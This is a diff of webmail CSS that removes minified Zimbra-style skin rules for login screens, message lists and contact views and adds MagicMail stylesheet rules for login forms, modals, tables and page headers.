-.LoginScreen .modernContentBox{background-color:#fff;box-shadow:0 4px 6px 0 rgba(0,0,0,.4);padding:40px;max-width:300px;margin:0 auto;position:relative;top:50%;transform:translateY(-50%);}
-.LoginScreen .contentBox,.SplashScreen .contentBox,.ErrorScreen .contentBox{background-color:#007CC3;padding:10px 0 40px;border-radius:3px;width:500px;}
-.LoginScreen .contentBox,.SplashScreen .contentBox{min-height:265px;}
-.LoginScreen .center-small .contentBox,.SplashScreen .center-small .contentBox,.ErrorScreen .center-small .contentBox{width:auto;}
-.center-small .form .submittd{text-align:left;}
-.LoginScreen H1,.SplashScreen H1{margin:0 30px 30px;overflow:hidden;}
-.extuserprovLogo{padding:30px 40px 0 10px;}
-#ZLoginAppName{color:white;display:none;}
-.LoginScreen .ImgLoginBanner,.LoginScreen .ImgAppBanner,.SplashScreen .ImgLoginBanner{cursor:pointer;display:block;}
-.LoginScreen .errorMessage{border:0;background-color:#efcbcb;padding:16px 40px;font-size:13px;color:#4d4d4d;font-stretch:expanded;text-align:left;border-bottom:solid;border-width:1px;border-color:#f72525;margin:0 -40px;}
-.LoginScreen .infoMessage{border:0;background-color:#8fbc8f;padding:16px 40px;font-size:13px;color:#4d4d4d;font-stretch:expanded;text-align:left;border-bottom:solid;border-width:1px;border-color:#006400;margin:0 -40px;}
-.LoginScreen #ZLoginErrorPanel,.ErrorScreen .InlineErrorPanel{border:0;left:auto;margin:10px 10%;position:relative;background-color:#FF9;padding:.5em 1em;border-radius:8px;}
-.LoginScreen #ZLoginErrorIcon,.ErrorScreen #ZErrorIcon{margin:auto 10px auto auto;}
-.LoginScreen .Footer,.SplashScreen .Footer,.LoginScreen .Footer-small,.SplashScreen .Footer-small{bottom:0;position:absolute;text-align:center;width:100%;z-index:10;}
-.SplashScreen .copyright{cursor:default;margin-bottom:5px;font-size:1rem;color:#656565;}
-.LoginScreen .copyright,.LoginScreen #ZLoginNotice{cursor:default;margin-bottom:5px;font-size:1rem;color:#f4f4f4;}
-.LoginScreen .zLoginField{border-radius:5px;}
-.LoginScreen .zLoginFieldInput{display:block;border-radius:2px;outline:none;}
-.LoginScreen .zLoginFieldLabel{display:inline-block;padding:2px 0 4px;color:#4d4d4d;}
-.LoginScreen INPUT[disabled]{background-color:white;}
-.LoginScreen .decor1{display:none;}
-.LoginScreen .decor2{display:none;}
-.LoginScreen #ZLoginNotice A{color:#fff;}
-.passwordRuleList{padding:2px 0 4px;color:#4d4d4d;list-style:none;}
-.resetPasswordRuleList{padding:2px 0 4px;list-style:none;color:#4d4d4d;}
-.confirmResetPasswordRuleList{color:#4d4d4d;padding-left:0;margin-bottom:0;list-style:none;}
-.SplashScreen .content{color:white;text-align:center;}
-.SplashScreen .message{color:white;cursor:default;padding-top:40px;font-size:1.36rem;font-weight:bold;}
-.SplashScreen .switch{margin:70px 100px 30px;margin-bottom:0;}
-.SplashScreen .switch A{color:white;text-decoration:underline;font-size:1rem;}
-.SplashScreen .decor1{display:none;}
-.SplashScreen .decor2{display:none;}
-.ErrorScreen .contentBox{padding-bottom:1em;}
-.ErrorScreen .ZErrorPanel{margin-top:30px;}
-.ErrorScreen H2{margin:0;}
-.ErrorScreen A:link,.ErrorScreen A:visited{color:#005A95;text-decoration:none;cursor:pointer;}
-.ErrorScreen A:hover{color:#005A95;text-decoration:underline;}
-.ErrorScreen A:active{color:darkgreen;text-decoration:underline;}
-.ErrorScreen .decor1{display:none;}
-.ErrorScreen .decor2{display:none;}
-.center-small .ImgLoginBanner,.ImgAppBanner{background-repeat:no-repeat;background-position:left center;background-image:url(../src/assets/images/mtaonline.net-large.png);width:200px;height:35px;}
-.ImgLoginBanner{background-repeat:no-repeat;background-position:bottom left;background-size:contain;background-image:url(../src/assets/images/mtaonline.net-large.png);width:260px;height:34px;}
-.console_inset_app_l .HSashThumb{margin-left:-2px;}
-.UserInfoLink{width:100%;text-align:left;white-space:nowrap;}
-.ZmPicker .ZToolbar{padding-top:1px;border-bottom:1px solid #f2f2f2;background-color:#e5e5e5;}
-.BannerTextUser{overflow:hidden!important;}
-.BannerTextUserOffline{text-align:left!important;padding:0 3px;}
-.ZmAppChooser{margin:0!important;}
-.ZAppTabBorder{border-radius:3px 3px 0 0;}
-.ZAppTabBorder .ZLeftIcon{padding-left:10px;}
-.ZAppTabBorder .ZWidgetTitle{font-size:1.1rem;font-weight:normal;padding-bottom:0;}
-.ZAppTabBorder .ZDropDown{padding-right:10px;}
-.ZSelectedPrev .ZAppTabBorder{border-right-color:#FFF;}
-.ZAppTabSpacer{height:2.5rem;margin-top:-1rem;}
-.ZTabBarPrefix{width:10px;border-bottom:1px solid #b2b2b2;padding:0;}
-.ZTabBarSuffix{width:100%;border-bottom:1px solid #b2b2b2;padding:0;}
-.quotaBar{height:8px;}
-.quotaLabel{text-align:right;font-size:.82rem;}
-.ZmInviteToolBar .ZToolbarTable,.ZmShareToolBar .ZToolbarTable{height:100%;}
-.ZNewButton .ZToolbarButtonBorder{background-color:rgba(255,255,255,.65);}
-.ZNewButton.ZHover .ZToolbarButtonBorder{background:#cce4f3;}
-.ZNewButton.ZActive .ZToolbarButtonBorder{background:#99cae7;}
-.ZToolbarButtonTable TD:first-child{padding-left:5px;}
-.ZToolbarButtonTable TD:last-child{padding-right:5px;}
-.ZmNetworkStatus{font-weight:bold;}
-.ZmNetworkStatusIcon{cursor:pointer;}
-.DwtInputField INPUT[type="text"],.DwtInputField INPUT[type="password"],.DwtSimpleInput{padding:0 3px;cursor:text;height:22px;height:2rem;color:black;border:1px solid #bfbfbf;}
-.DwtInputField TEXTAREA{padding:.2em .3em;cursor:text;color:black;border:1px solid #bfbfbf;}
-.DwtInputField-error INPUT[type="text"],.DwtInputField-error INPUT[type="password"],.DwtSimpleInput-error{padding:0 3px;cursor:text;height:22px;height:2rem;color:black;background-color:#FFF0F0;border:1px solid #bfbfbf;}
-.DwtInputField-error TEXTAREA{padding:.2em .3em;cursor:text;color:black;background-color:#FFF0F0;border:1px solid #bfbfbf;}
-.DwtInputField-focused INPUT[type="text"],.DwtInputField-focused INPUT[type="password"],.DwtSimpleInput-focused{padding:0 3px;cursor:text;height:22px;height:2rem;color:black;background-color:#FFFFE0;border-color:#4c6573 #1e282e #1e282e #5b798a;outline:none;outline:none;}
-.DwtInputField-focused TEXTAREA{padding:.2em .3em;cursor:text;color:black;background-color:#FFFFE0;border-color:#4c6573 #1e282e #1e282e #5b798a;outline:none;}
-.DwtInputField-disabled INPUT[type="text"],.DwtInputField-disabled INPUT[type="password"],.DwtSimpleInput-disabled{padding:0 3px;cursor:text;height:22px;height:2rem;color:#999;background-color:transparent;border:1px solid #e5e5e5;}
-.DwtInputField-disabled TEXTAREA{padding:.2em .3em;cursor:text;color:#999;background-color:transparent;border:1px solid #e5e5e5;}
-.DwtInputField-hint INPUT[type="text"],.DwtInputField-hint INPUT[type="password"],.DwtInputField-hint INPUT,.DwtSimpleInput-hint{padding:0 3px;cursor:text;height:22px;height:2rem;color:black;border:1px solid #bfbfbf;color:#999;font-style:italic;cursor:default;}
-.DwtInputField-hint TEXTAREA{padding:.2em .3em;cursor:text;color:#999;font-style:italic;cursor:default;}
-.DwtInputField-errorhint INPUT[type="text"],.DwtInputField-errorhint INPUT[type="password"],.DwtSimpleInput-errorhint{padding:0 3px;cursor:text;height:22px;height:2rem;color:black;background-color:#FFF0F0;border:1px solid #bfbfbf;color:#999;font-style:italic;cursor:default;}
-.DwtInputField-errorhint TEXTAREA{color:black;background-color:#FFF0F0;border:1px solid #bfbfbf;color:#CCC;}
-TEXTAREA .BannerBar *{font-size:.82rem;}
-.BannerBar{padding-top:1px;height:1px;}
-.BannerBar TD{padding-right:0;}
-.BannerBar .quotabar{background-color:white;}
-.BannerTextQuota{text-align:center;vertical-align:top;}
-.BannerTextUser,.BannerTextQuota{cursor:default;}
-.BannerTextQuota-MultiAccount{padding-top:5px;}
-INPUT[type="text"],INPUT[type="password"]{border:1px solid #bfbfbf;margin:0;border-width:1px;border-style:solid;}
-SELECT{border:1px solid #bfbfbf;margin:0;border-width:1px;border-style:solid;}
-.TabSpacer{display:none;}
-.Tab{white-space:nowrap;height:30px;padding-right:5px!important;}
-.TbTop{border-width:0 1px 1px 0!important;padding-right:5px!important;}
-.TbBottom{border-width:0 1px 1px 0!important;padding-right:5px!important;}
-.TabFiller{width:100%;}
-.List .Header TH{border-right:1px solid #f2f2f2;}
-.ZhSubTabs{background-color:#e5e5e5;padding-top:2px;}
-.ZhSubTabs{padding:5px!important;}
-.ZhSubTabs .TabSelected{color:#333;background-color:#fff;border-color:#b2b2b2 #b2b2b2 #fff;cursor:pointer;}
-.ZhRow TD,.ZhRowOdd TD{border-width:0 0 1px!important;padding-left:3px!important;}
-.ZmSearchToolbarCell .ZSelected .ZToolbarButtonBorder{background-color:#FBF9F4!important;border:2px inset;color:white;}
-.ZAppTabBorder .ZLeftIcon DIV{display:none;}
-.DwtListView-Column{background-color:#fff;}
-.DwtListView-Column TD{color:#727272;}
-.overviewHeader{border:0;padding:1px 0;}
-.overviewHeader>TABLE{border:1px solid white;}
-.overviewHeader .ZButton{height:auto;}
-.FirstOverviewHeader.overviewHeader{padding-top:0;}
-.RowDouble{height:auto;padding-top:0;}
-.RowDouble .TopRow,.RowDouble .ImgCheckboxChecked,.RowDouble .ImgCheckboxUnchecked{margin:6px 0 0;}
-.RowDouble .ZmMsgListExpand{margin-left:-2px;margin-right:2px;}
-.RowDouble .BottomRow{margin:4px 0 6px;}
-.Row-matched,.RowDouble-matched,.RowDouble-matched .ZmListFlagsWrapper,.RowDouble-matched .ZmMsgListDate{background-color:#FFFEC4;}
-.TopRow,.BottomRow{height:16px;height:1.6rem;position:relative;}
-.ZmListFlagsWrapper{position:absolute;right:0;background-color:#fff;}
-.SimpleContact .ZmListFlagsWrapper{padding:.08rem 0;right:0;}
-.SimpleContact .ImgCheckboxUnchecked,.SimpleContact .ImgCheckboxChecked,.ZmContactIcon{margin:0 5px 0 2px;}
-.ZmListFlagsWrapper DIV{margin:0 2px 0 3px;}
-.TopRow .ImgMsgRead,.TopRow .ImgMsgUnread{margin:0 3px 0 3px;}
-.TopRow .ImgCheckboxUnchecked,.TopRow .ImgCheckboxChecked{margin:0 0 0 -1px;}
-.TopRow .ImgNodeCollapsed,.TopRow .ImgNodeExpanded{padding:0;}
-.ZmMsgListColTag{padding:0 2px 0 3px;vertical-align:middle;}
-.BottomRow .ZmMsgListColTag{margin-right:3px;}
-.ZmMsgListDate{position:absolute;right:0;text-align:right;}
-.ZmMsgListColSelection,.ZmMsgListColFlag,.ZmMsgListColTag,.ZmMsgListColAccount,.ZmMsgListColStatus,.ZmMsgListColMute,.ZmMsgListColRead,.ZmMsgListColAttachment,.ZmMsgListColExpand{width:16px;}
-.ZmMsgListColPriority{width:8px;margin-left:3px;}
-.ZmMsgListColFolder,.ZmMsgListColSize,.ZmMsgListColDate{text-align:left;}
-.ZToolbarTable .vertSep{border-color:transparent;}
-.appt_new_time .ImgBlank_16,.appt_time .ImgBlank_16{display:none;}
-.ZmConvView2FullWidth{width:100%;}
-.ZmHtmlEditor .mce-btn,.ZmHtmlEditor .mce-panel{background-color:#FFF;background-image:none;}
-.form .ZLoginButton{background-color:#007CC3;border-color:white;color:white;}
-.form .ZLoginButton:hover{background-color:#3f9cd2;color:#333;}
-.form .ZLoginButton:active{background-color:#005d92;}
-#skin_spacing_tree{padding-bottom:0;}
-#skin_spacing_app_row{height:2.4rem;}
-.ZAppTabBorder .ZWidgetTitle{font-size:1.3rem;}
-.ZmOverview .overviewHeader-Text.FakeAnchor>DIV{margin-right:2px;}
-#skin_spacing_tree,#skin_spacing_tree_footer{border-width:0;margin-left:3px;}
-.ZmConvView,.ZmConvView2,.ZmMailMsgView{background-color:#FFF;}
-.ZmMailMsgView>DIV{background-color:white;}
-#skin_container_tree,.Conv2View,.Conv2View-bottom{background-color:transparent;background-image:none;}
-.NoResults{background-color:transparent;padding:1.5em 1em;border-radius:3px;}
-.overviewHeader{background-color:transparent;padding-top:0;padding-bottom:0;}
-.overviewHeader>TABLE{border-color:transparent;}
-.overviewHeader-selected>TABLE{border-color:#99cae7;}
-.overviewHeader-selected-focused>TABLE{border-color:#4c6573 #1e282e #1e282e #5b798a;outline:none;}
-.overviewHeader TD{background-color:transparent;font-size:1.3rem;font-weight:normal;}
-.ZNewButton{border-radius:3px;margin-right:0;overflow:hidden!important;right:-5px;}
-.ZNewButton .ZToolbarButtonBorder{background-color:#0087c3;border-color:#0087c3;}
-.ZNewButton.ZFocused .ZToolbarButtonBorder,.ZNewButton.ZHover .ZToolbarButtonBorder,.ZNewButton.ZActive .ZToolbarButtonBorder{background-color:#00AAF6;border-color:#00AAF6;}
-.ZNewButton.ZActive .ZToolbarButtonBorder{background-color:#F15922;border-color:#F15922;background-image:none;}
-.ZNewButton .ZToolbarButtonTable .ZLeftIcon{display:none;}
-.ZNewButton .ZToolbarButtonTable .ZWidgetTitle,.ZNewButton.ZHover .ZToolbarButtonTable .ZWidgetTitle{color:white;}
-.ZNewButton .ImgSelectPullDownArrow,.ZNewButton.ZHover .ImgSelectPullDownArrowHover,.ZNewButton.ZActive .ImgSelectPullDownArrow{background-image:url(/skins/harmony/img/harmony/ImgNewSelectPullDownArrow.png?v=250123180901);background-position:0 0;}
-.ZmMailMsgCapsuleView{border-width:0 0 1px;border-radius:0;}
-.ZmMailMsgCapsuleView .separator{border-color:transparent;}
-.Conv2Messages{padding:.25em .5em;}
-.Conv2Messages .Last{border-color:transparent;border-radius:3px;}
-.Conv2Header,.Conv2Header .info{background-color:#f2f2f2;border-bottom-width:0;}
-.Conv2Header{height:2.2em;}
-.Conv2Header .subject,.Conv2Header .info{color:#333;}
-.Conv2MsgHeader .image{border-radius:24px;}
-.Collapsed .Conv2MsgHeader .image{border-radius:16px;}
-.DwtListView-Sash:first-child DIV{background-color:#e5e5e5!important;}
-TD.DwtListView-Column{background-color:#f2f2f2;border-bottom-width:0;font-weight:normal;}
-TD.DwtListView-ColumnActive{background-color:#f7f7f7;font-weight:bold;}
-.DwtListView-Rows-Empty>*{border-color:transparent;margin:0;border-width:1px;border-style:solid;}
-.DwtListView-Rows-Empty:focus{outline:none;}
-.DwtListView-Rows-Empty:focus>*{border-color:#4c6573 #1e282e #1e282e #5b798a;outline:none;}
-.console_inset_app_l{z-index:499!important;}
-.Row{height:20px;height:2rem;padding-top:4px;}
-.ZmContactSplitView,.ZmContactSimpleView,.ZmContactInfoView,.SimpleContact{background-color:transparent;border-color:transparent;}
-.ZmContactInfoView .headerRow{background-color:transparent;border-color:transparent;margin:.25em 0;border-radius:3px;}
-.RowDouble{padding:.25em .5em;}
-.RowDouble .TopRow{position:relative;}
-.ZmComposeView INPUT,.ZmComposeView TEXTAREA{border:none;outline:none;}
-.ZmContactSplitView,.ZmContactSimpleView,.ZmContactInfoView .headerRow,.ZmContactView .headerRow{background-color:transparent;border-color:transparent;}
-.ZmContactInfoView{background-color:white;border-width:0;padding:1em 1em 0;}
-.ZmContactInfoView .headerRow{margin-bottom:.5em;padding-top:.25em;}
-.ZmContactInfoView .contactGroupTable{border-collapse:separate;border-color:#e5e5e5;border-radius:3px;}
-.ZmContactView{background-color:transparent;}
-.ZmEditGroupContact{background-color:white;border:1px solid #bfbfbf;}
-.SimpleContact{background-color:transparent;background-image:none;height:22px;height:2.2rem;}
-.SimpleContact>DIV{background-color:transparent;border-color:transparent;}
-.SimpleContact .ZmListFlagsWrapper{height:16px;margin-top:2px;}
-.ZmEditGroupContact .Row{margin-bottom:.5em;}
-.groupMembers .ZmEditGroupContact .Row{background-color:white;border-color:#FFF;margin:.5em;}
-.ZmContactView .contactHeaderSubTable,.ZmContactInfoView .contactHeaderSubTable{background-color:#e5e5e5;border-color:transparent;}
-.ZmCalViewMgr,.calendar_view{background-color:transparent;}
-.appt_body,.appt_30_body,.appt_allday_body{background-color:white;border-color:transparent;box-shadow:0 0 0 transparent;}
-.appt_body>TABLE,.appt_30_body>TABLE,.appt_allday_body>TABLE{background-color:transparent;background-image:none;border-color:transparent;}
-.ZmApptComposeField .FakeAnchor{float:right;max-width:22em;}
-.ZmScheduleAssistantView{background-color:white;}
-.InvResponseBar{background-color:#e5e5e5;border-top-color:#ccc;}
-.InvResponseBar .ZButtonBorder{background-color:#FFF;}
-.ZmTaskMultiView .DwtListView-Column{background-color:transparent;border-color:transparent;}
-.ZmTaskMultiView .ZmMailMsgView{background-color:white;}
-.newTaskBannerSep{background-color:transparent;border-bottom-width:0;margin-bottom:1em;}
-.newTaskBannerSep>TBODY>TR>TD{background-color:#e5e5e5;padding:.5em;}
-.ZmTaskEditView .miniCalendarButton .ZButtonBorder,.ZmTaskEditView .miniTimeButton .ZButtonBorder,.ZmTaskEditView .ZmCompletionSelector .ZButtonBorder{margin-top:0;}
-#skin_dropMenu *:focus,#skin_userAndQuota *:focus{outline-color:#FFF;}
-.ZmBriefcaseDetailListView{background-color:transparent;}
-.ZmPreviewView .MsgHeaderTable>TBODY>TR>TD{background-color:transparent!important;}
-.ZmPreviewView .PreviewViewHeader{margin:0 1em;}
-.ZmBriefcaseDetailListView .Row TABLE{border-collapse:separate;margin:.25em 0;}
-.ZmDocsEditView{background-color:#FFF;}
-.ZmDocsEditViewHeaderCell>DIV{margin:5px 3px 0;}
-.ZmPrefView{background-color:#FFF;}
-.ZOptionsSectionMain{background-color:white;border-radius:0 0 3px 3px;}
-.prefHeader{border-radius:3px;}
-.ZmPrefZimletListView .Row{height:auto;}
-.ZmWhiteBlackList{border:1px solid #bfbfbf;margin-left:0;border-radius:0;}
-.ZmFilterRulesView .ZOptionsSectionMain{background-color:#FFF;border-radius:0;}
-.ZmFilterRulesView .DwtChooserListView{background-color:white;min-height:160px;}
-.WindowInnerContainer{background-color:#FFF;border-top:none;}
-.ZmReminderDialog .DwtToolbarButton{border:none;}
-.ZmHtmlEditor .ZmHtmlEditorTextArea{border:1px solid #bfbfbf;padding:.25em;}
-.DwtCalendar{border-top:1px solid #bfbfbf;}
-.DwtMenu .DwtCalendar{border-top-width:0;}
-.ZmContactPicker .DwtChooserListView{background-color:white;border-color:#bfbfbf;}
-.BriefcaseTabBox{border-color:#bfbfbf;border-style:solid;border-radius:0;}
-.ZmContactSplitView .rowLabel,.ZmMailMsgView .LabelColName,.ZmMailMsgCapsuleView .LabelColName{color:#848484;font-weight:normal;}
-.ImgNewSelectPullDownArrow{background:url('/skins/harmony/img/harmony/ImgNewSelectPullDownArrow.png?v=250123180901') 0 0 no-repeat;width:12px!important;height:16px!important;overflow:hidden;}
-.ImgDisconnect{background:url('/skins/harmony/img/zimbra.png?v=250123180901') 0 0 no-repeat;width:16px!important;height:16px!important;overflow:hidden;}
-.ImgMsgRead{background:url('/skins/harmony/img/zimbra.png?v=250123180901') 0 -17px no-repeat;width:16px!important;height:16px!important;overflow:hidden;}
-.ImgMsgUnread{background:url('/skins/harmony/img/zimbra.png?v=250123180901') 0 -34px no-repeat;width:16px!important;height:16px!important;overflow:hidden;}
-.ImgRefreshAll{background:url('/skins/harmony/img/zimbra.png?v=250123180901') 0 -51px no-repeat;width:16px!important;height:16px!important;overflow:hidden;}
+#MagicWrapper {
+    width: 100%;
+}
+
+table {
+    border-collapse: collapse;
+}
+
+#MainHeaderTable {
+    width: 100%;
+    background: #004d66;
+    color: white;
+    padding: 10px;
+}
+.errorMessage{
+  color: #000 !important;
+}
+.MagicNavTab {
+    display: inline-block;
+    padding: 8px 15px;
+    background: #006699;
+    border-radius: 4px;
+}
+
+.MagicNavTab a {
+    color: #fff;
+    text-decoration: none;
+}
+
+.MagicContentTable {
+    width: 100%;
+    padding: 30px;
+}
+
+#loginContentCell {
+    display: flex;
+    justify-content: center;
+    gap: 60px;
+    align-items: flex-start;
+    flex-wrap: wrap;
+}
+
+.login-info-content {
+    max-width: 400px;
+}
+
+#login-form-wrapper {
+    background: white;
+    padding: 20px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+}
+
+#login-form-table td,
+#login-form-table th {
+    padding: 8px;
+}
+
+input[type=email],
+input[type=password] {
+    width: 220px;
+    padding: 8px;
+}
+
+input[type=submit] {
+    padding: 8px 20px;
+    cursor: pointer;
+}
+
+.error {
+    color: #fff;
+    background: #c00;
+    padding: 10px;
+    text-align: center;
+}
+
+.MagicCompanyFooter,
+.MagicCopyRight {
+    text-align: center;
+    padding: 15px;
+    background: #f2f2f2;
+}
+
+.mm-modal {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,.5);
+}
+
+.mm-modal-content {
+    width: 420px;
+    background: white;
+    margin: 100px auto;
+    padding: 20px;
+}
+
+.mm-modal-footer {
+    margin-top: 20px;
+    text-align: right;
+}
+
+.mm-modal-footer input {
+    margin-left: 10px;
+}
+/*
+ * COPYRIGHT INFORMATION - DO NOT REMOVE
+ *
+ * Copyright (c) LinuxMagic Inc. 2010-2020 All Rights Reserved
+ *
+ * This file contains Original Code as created by LinuxMagic Inc.
+ *
+ * The Original Code is distributed on an 'AS IS' basis,
+ * WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESS OR IMPLIED, AND LINUXMAGIC
+ * HEREBY DISCLAIMS ALL SUCH WARRANTIES, INCLUDING WITHOUT LIMITATION, ANY
+ * WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, QUIET
+ * ENJOYMENT OR NON-INFRINGEMENT.
+ *
+ * Do NOT download, distribute, use or alter this software or file in any
+ * way without express written permission from LinuxMagic Inc. or its parent
+ * company Wizard Tower TechnoServices signed by an authorized company officer.
+ *
+ * Author(s): Unknown
+ *            Steven Hall <stevenh@linuxmagic.com>
+ *            Arturo Gamez Ortega <arturo@linuxmagic.com>
+ *
+ * $Id: magicmail.css 45918 2023-04-10 17:48:02Z shaun $
+ */
+
+/* @import "modal.css";
+@import "pagination.css"; */
+
+/* Quick Styles */
+a {
+    color: #10456B;
+}
+
+a:hover {
+    color: #000;
+}
+
+.muddyAqua {
+    color: #18598B;
+}
+
+/* Header FONT sizes SHOULD be relative sizing */
+h2 {
+    color: #10456B;
+    font-size: 150%;
+    font-weight: bold;
+    margin: 0 0 8px;
+}
+
+h3 {
+    color: #343434;
+    font-size: 1.2em;
+    font-weight: bold;
+    margin: 4px 0;
+}
+
+.minibutton {
+    background: #FFF;
+    border: 1px solid #999;
+    display: inline-block;
+    -moz-border-radius: 3px;
+    padding: 1px;
+    -webkit-border-radius: 3px;
+}
+
+.minibutton a {
+    background: #DEDEDE url(/images/background-mailboxheader.gif) repeat-x;
+    color: #343434;
+    cursor: pointer;
+    display: block;
+    font-size: 11px;
+    padding: 1px 6px;
+    text-align: center;
+    text-decoration: none;
+    white-space: nowrap;
+}
+
+.minibutton a:hover {
+    background: #FFF url(/images/background-mailbox.gif) repeat-x top left;
+}
+
+/* Only used in Admin Interface, but logical to be the same across the board */
+.helpLink {
+    padding-right: 10px;
+    float: right;
+}
+
+/* Probably be considered for wizard.css */
+td.success {
+    border: 2px solid #008800 !important
+}
+
+td.error {
+    border: 2px solid #990000 !important;
+}
+
+/* Used in admin, portal, and js */
+td.folderName > div {
+    overflow: hidden;
+    white-space: nowrap;
+    text-overflow: ellipsis;
+    max-width: 317px;
+    display: inline-block;
+    line-height: 25px;
+}
+
+/* table row number is even */
+/* MP: We can deprecate now, using nth-child instead */
+tr.even {
+    background: #dedfde none repeat scroll 0 0;
+}
+
+/* Standard MagicMail Layout Items*/
+/* In general, only used to set body background, and page sizing */
+.MagicBody {
+    background: #A5AAAD url(../src/assets/images/pagebackground.gif) repeat-x;
+    padding-top: 27px;
+
+    /* Deprecate, if you need this, better on body tag */
+    text-align: center;
+}
+
+.inpopup {
+    margin-left: 50px;
+}
+
+/* We want to use standard font classes, but this is a workaround */
+/* This should inherit from the MagicBody, but since it doesn't
+   always, you can use this in a table or div section */
+.MagicStandardFont {
+   font-family: 12px Verdana, Tahoma, Arial, sans-serif !important;
+}
+
+/* Normally we float this in the center, and 30 pixels from the top, 10 pixels from the bottom */
+#MagicWrapper {
+    margin: 0 auto 0 auto;
+    text-align: left;
+    position: relative;
+    height: 100%;
+}
+
+.MagicOuterTable {
+    /* border-spacing: 0; inherited from wizard.css */
+    /* border-collapse: collapse; inherited from wizard.css */
+    /* If you want a seperated footer, use the border on the first child */
+    border-collapse: separate;
+    border: 2px solid #424542;
+    width: 1000px;
+    height: 100%;
+    margin: 0 auto 0 auto;
+}
+
+/* Set Blue Curved Background over the grey gradient background on parent */
+/* This should be moved to css.css as it only applies to admin interfaces */
+#MainHeaderTable tr:first-child {
+    background: url('../src/assets/images/blue_curve_top.svg') no-repeat;
+}
+
+/* Only problem with the technique above, is that every child table
+   will try also to set that as a background. Override for child tables */
+#MainHeaderTable tr:first-child table tr:first-child {
+    background: none;
+}
+
+/* End Admin Only */
+.MagicOuterTable tr:first-child {
+    /* border: 4px solid #424542; */
+    height: 100%;
+}
+
+.MagicOuterTable td {
+    vertical-align: top; /* Override Wizard Behavior */
+}
+
+.MagicContentTable {
+    border-collapse: collapse;
+    border-spacing: 0;
+    background: url(../src/assets/images/blue_curve_body.svg) no-repeat, linear-gradient(#FFF, #e6e7e8);
+    width: 100%;
+    margin: 0;
+    padding: 0;
+    font-family: Verdana, Tahoma, Arial, sans-serif !important;
+
+    /* Ugly way to do this.. Since you need to change the amount you subtrack everytime the header changes
+       but this will allow the table to expand to the full size of the parent */
+    height: calc(100% - 119px);
+}
+
+/* This may replace MagicContent, same as #EmailOptions from user interface */
+#MagicMailDataDiv {
+    line-height: 150%;
+    margin: 0 8px 0 auto;
+    width: 100%
+}
+
+/* Legacy, but useful for tables that are NOT data tables */
+/* MP: Of course,we can slowly move these to flex divs */
+/* Moved from the admin interface specific css */
+/* MP: They conflicted, we need this in global only */
+table.MagicEmbeddedTable {
+    max-width: 690px;
+    border: 1px solid #aaa;
+    background-color: #ffffff;
+    font-family: Verdana, Arial, Helvetica, sans-serif;
+    font-size: 12px;
+}
+
+table.noBorder {
+    border: 0px;
+}
+
+table.multiListHolder {
+    width: 100%;
+}
+
+table.multiListHolder tr td div.multiListTitle {
+    text-align: left;
+    margin-left: 24px;
+    font-weight: bold;
+}
+
+table.MagicEmbeddedTable .multiListHolder td {
+    text-align: center;
+}
+
+table.MagicEmbeddedTable .multiListHolder td.multiListMiddleButtons {
+    vertical-align: middle;
+}
+
+.MagicEmbeddedTable th {
+    background: #EFEFEF;
+    border-bottom: 1px solid #AAA;
+    height: 25px;
+    /* padding-left: 10px; No need fo this */
+}
+
+/* Don't know if this is needed everywhere */
+table.MagicEmbeddedTable td.MagicLoginInfo {
+    word-break: break-all;
+}
+
+table.MagicEmbeddedTable tr {
+    /*
+     * ie8 centres content of cells otherwise.
+     * for instance see appearance of single account manage page without this.
+     */
+    text-align: left;
+}
+
+table.MagicEmbeddedTable th {
+    /* Should be in Embedded Table Definition */
+    background-color: #EFEFEF;
+    border-bottom: 1px solid #ADAAAD;
+    font-size: 14px;
+    /* we text-align: left rows, but want headers to be centred */
+    text-align: center;
+}
+
+table.MagicEmbeddedTable th a {
+    font-weight: bold;
+    text-decoration: none;
+    font-size: 12px;
+    color: #10456B;
+}
+
+table.MagicEmbeddedTable th a:hover {
+    color: #000;
+}
+
+table.MagicEmbeddedTableHeader {
+    /* Should be in Embedded Table Definition */
+    background-color: #efefef;
+    border-bottom: #aaa 1px solid;
+}
+
+table.MagicEmbeddedTable .error {
+    text-align: center;
+    border: 2px #990000 solid;
+    /* background-color: #FFCCD7; */
+    font-weight: bold;
+}
+
+table.MagicEmbeddedTable .success {
+    text-align: center;
+    background-color: #88EE88;
+    border: 2px solid #008800;
+    font-weight: bold;
+}
+
+table.MagicEmbeddedTable .header {
+    background-color: #afafaf;
+    color: white; font-weight: bold;
+    padding: 2px; text-align: center;
+}
+
+table.MagicEmbeddedTable .entry {
+    border-left: 1px solid #afafaf;
+    padding-left: 4px;
+}
+
+table.MagicEmbeddedTable .entryAlt {
+    border-left: 1px solid #afafaf;
+    padding-left: 4px;
+}
+
+/*
+ * TODO: these tables should be converted to MagicDataTable, but for now to
+ * consolidate alt rows I apply this rule
+ * TODO: Eventually can move to divs, now that display: flex is available for
+ * layout
+ */
+table.MagicEmbeddedTable tr.even,
+table.MagicEmbeddedTable td.even {
+    background: #dedfde;
+}
+
+table.MagicEmbeddedTable td.MagicSettingsLabel {
+    width: 350px;
+    height: 32px;
+}
+
+table.MagicEmbeddedTable td.MagicSettingsInput {
+    width: 160px;
+    height: 32px;
+}
+
+table.MagicEmbeddedTable td.MagicSettingsHelp {
+    width: 40px;
+    height: 32px;
+}
+
+table.MagicEmbeddedTable td.MagicLoginInfo {
+
+    word-break: break-all;
+}
+
+.MagicCompanyFooter td,
+.MagicCopyRight  td {
+    font-size: 11px;
+    line-height: 1.3em;
+    text-align: center;
+}
+
+.MagicCompanyFooter {
+    background-color: #f0f1f2;
+}
+
+.MagicCopyRight {
+    background-color: #18598B;
+    color: #FFF;
+}
+
+.MagicCopyRight p {
+    margin: 10px 0 5px;
+}
+
+/* Header, from /usr/share/magicmail/php/html_files/EN/header_style1.html */
+#MainHeaderTable {
+    background-image: linear-gradient(#fefefe, #e6e7e8);
+    border-spacing: 0;
+    border-collapse: collapse;
+    height: 104px;
+    width: 100%;
+}
+
+#MainHeaderTable table {
+    float: right;
+}
+
+/* New MagicMail_logo_white is 283px Ã— 75px */
+#MMLogo {
+    height: 77px;
+    padding-left: 30px !important;
+    padding-top: 14px !important;
+}
+
+/* New Image, Your Company Logo (PNG) is 276pxx66px */
+#HeaderLogo {
+    height: 77px;
+    vertical-align: top;
+    padding: 10px 10px 0px 0px !important;
+}
+
+/* MP: Fix this method, we can do better than this.. */
